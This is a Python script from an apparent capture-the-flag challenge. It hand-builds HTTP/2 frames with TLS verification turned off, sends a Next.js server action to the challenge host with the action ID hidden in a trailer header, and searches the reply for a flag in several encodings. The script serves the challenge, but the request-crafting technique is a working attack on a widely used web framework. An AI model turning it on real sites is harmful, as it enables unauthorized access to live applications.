#!/usr/bin/env python3
"""
Deep analysis of recovery action response
Look for hidden flag in the full response, not just obvious places
"""
import socket
import ssl
import struct
import time
import re
import base64
import json
from hpack import Encoder

HOST = "funicular-gm2cxozn.alfactf.ru"
PORT = 443
ACTION_ID_FILE = "/tmp/funi.actionid"

with open(ACTION_ID_FILE) as f:
    ACTION_ID = f.read().strip()

def send_recovery_and_analyze():
    """Send recovery action and do deep analysis of response"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    raw = socket.create_connection((HOST, PORT), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)

    if sock.selected_alpn_protocol() != "h2":
        raise RuntimeError("H2 not supported")

    # H2 preface
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
    sock.sendall(b"\x00\x00\x00\x04\x00\x00\x00\x00\x00")

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except:
        pass
    sock.settimeout(15)

    # Simple recovery payload
    payload = '["$K1"]'
    body = payload.encode()

    enc = Encoder()
    headers = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("accept", "text/x-component"),
        ("content-type", "text/plain;charset=UTF-8"),
        ("content-length", str(len(body))),
        ("trailer", "next-action"),
        ("user-agent", "deep-analysis"),
    ])

    trailer = enc.encode([("next-action", ACTION_ID)])

    sid = 1

    # Send frames
    frame = struct.pack(">I", len(headers))[1:] + b"\x01\x04" + struct.pack(">I", sid) + headers
    sock.sendall(frame)

    frame = struct.pack(">I", len(body))[1:] + b"\x00\x00" + struct.pack(">I", sid) + body
    sock.sendall(frame)

    frame = struct.pack(">I", len(trailer))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer
    sock.sendall(frame)

    # Read ALL response data
    all_frames = []
    response_body = b""
    end_time = time.time() + 20

    while time.time() < end_time:
        try:
            header = sock.recv(9)
            if len(header) < 9:
                break

            length = struct.unpack(">I", b"\x00" + header[0:3])[0]
            frame_type = header[3]
            flags = header[4]
            stream_id = struct.unpack(">I", header[5:9])[0] & 0x7FFFFFFF

            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk:
                    break
                payload += chunk

            all_frames.append((frame_type, flags, stream_id, length, payload))

            if frame_type == 0:  # DATA
                response_body += payload

            if stream_id == sid and (flags & 1):  # END_STREAM
                break

        except Exception:
            break

    sock.close()
    return all_frames, response_body

def analyze_response_deeply(frames, body):
    """Deep analysis of the response"""
    print("=" * 80)
    print("DEEP RESPONSE ANALYSIS")
    print("=" * 80)

    # 1. Frame analysis
    print("\n[+] HTTP/2 Frames:")
    for i, (frame_type, flags, stream_id, length, payload) in enumerate(frames):
        print(f"  Frame {i}: type={frame_type}, flags=0x{flags:02x}, stream={stream_id}, len={length}")

    # 2. Raw body hex dump (first 1000 bytes)
    print(f"\n[+] Raw body (first 1000 bytes):")
    body_preview = body[:1000]
    hex_dump = body_preview.hex()
    for i in range(0, len(hex_dump), 64):
        print(f"  {i//2:04x}: {hex_dump[i:i+64]}")

    # 3. Body as string
    body_str = body.decode('utf-8', errors='replace')
    print(f"\n[+] Body as UTF-8 (length: {len(body_str)}):")
    print(body_str[:2000] + ("..." if len(body_str) > 2000 else ""))

    # 4. Look for flags in various encodings
    print(f"\n[+] Flag search:")

    # Direct search
    direct_flags = re.findall(r'alfa\{[^}]+\}', body_str, re.IGNORECASE)
    if direct_flags:
        print(f"  Direct flags found: {direct_flags}")

    # Base64 encoded
    b64_patterns = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', body_str)
    for pattern in b64_patterns[:10]:  # Check first 10 base64-like strings
        try:
            decoded = base64.b64decode(pattern).decode('utf-8', errors='ignore')
            if 'alfa{' in decoded.lower():
                print(f"  Base64 flag found: {pattern} -> {decoded}")
        except:
            pass

    # Hex encoded
    hex_patterns = re.findall(r'[0-9a-fA-F]{40,}', body_str)
    for pattern in hex_patterns[:10]:
        try:
            decoded = bytes.fromhex(pattern).decode('utf-8', errors='ignore')
            if 'alfa{' in decoded.lower():
                print(f"  Hex flag found: {pattern} -> {decoded}")
        except:
            pass

    # URL encoded
    url_patterns = re.findall(r'%[0-9a-fA-F]{2}(?:%[0-9a-fA-F]{2})*', body_str)
    for pattern in url_patterns:
        try:
            from urllib.parse import unquote
            decoded = unquote(pattern)
            if 'alfa{' in decoded.lower():
                print(f"  URL encoded flag found: {pattern} -> {decoded}")
        except:
            pass

    # 5. Look for hidden text in RSC format
    print(f"\n[+] RSC row analysis:")
    rows = re.findall(r'^(\d+):(.+?)(?=\n\d+:|$)', body_str, re.MULTILINE | re.DOTALL)
    for row_num, content in rows:
        print(f"  Row {row_num}: {content[:100]}{'...' if len(content) > 100 else ''}")

        # Check if row content has flag
        if 'alfa{' in content.lower():
            flag_match = re.search(r'alfa\{[^}]+\}', content, re.IGNORECASE)
            if flag_match:
                print(f"    ^^^ FLAG FOUND IN ROW {row_num}: {flag_match.group(0)}")

    # 6. JSON parsing
    print(f"\n[+] JSON object analysis:")
    json_objects = re.findall(r'\{[^}]*\}', body_str)
    for i, json_str in enumerate(json_objects[:10]):
        try:
            parsed = json.loads(json_str)
            print(f"  JSON {i}: {parsed}")

            # Check for flag in JSON values
            json_text = json.dumps(parsed)
            if 'alfa{' in json_text.lower():
                flag_match = re.search(r'alfa\{[^}]+\}', json_text, re.IGNORECASE)
                if flag_match:
                    print(f"    ^^^ FLAG FOUND IN JSON {i}: {flag_match.group(0)}")
        except:
            pass

    # 7. Look for suspicious strings
    print(f"\n[+] Suspicious strings:")
    suspicious = [
        'secret', 'password', 'flag', 'key', 'token', 'admin',
        'код', 'пароль', 'секрет', 'ключ'
    ]

    for word in suspicious:
        matches = re.findall(rf'\b{word}[^,\n\r]*', body_str, re.IGNORECASE)
        if matches:
            print(f"  '{word}': {matches[:3]}")

def main():
    print(f"# Using action_id = {ACTION_ID}")

    try:
        print("[+] Sending recovery action and capturing full response...")
        frames, body = send_recovery_and_analyze()

        analyze_response_deeply(frames, body)

        print("\n" + "=" * 80)
        print("Deep analysis complete.")
        print("If no flag found, it may require different exploitation approach.")

    except Exception as e:
        print(f"[-] Analysis failed: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()